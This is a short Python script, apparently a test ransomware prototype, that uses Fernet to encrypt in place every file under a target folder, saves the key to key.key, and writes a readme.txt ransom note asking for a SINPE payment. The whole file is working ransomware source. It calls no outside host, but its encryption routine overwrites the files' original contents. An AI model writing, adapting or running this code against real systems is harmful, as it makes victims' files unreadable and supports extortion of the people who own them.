from cryptography.fernet import Fernet
import os

def generate_key():
    key = Fernet.generate_key()
    with open ('key.key', 'wb') as key_file:
        key_file.write(key)
         
def load_key():
    return open('key.key', 'rb').read()

def encrypt(path_to_encrypt, key):
    f = Fernet(key)
    for root, dirs, files in os.walk(path_to_encrypt):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as file:
                file_data = file.read()
            encrypted_data = f.encrypt(file_data)
            with open(file_path, 'wb') as file:
                file.write(encrypted_data)

if __name__ == '__main__':
    path_to_ecrypt = 'C:\\Users\\Jeremy\\Desktop\\Prueba ransonware'

    generate_key()
    key = load_key()
    encrypt(path_to_ecrypt, key)

    with open(path_to_ecrypt+'\\'+'readme.txt', 'w')as file:
        file.write('Hagame un sinpe papi')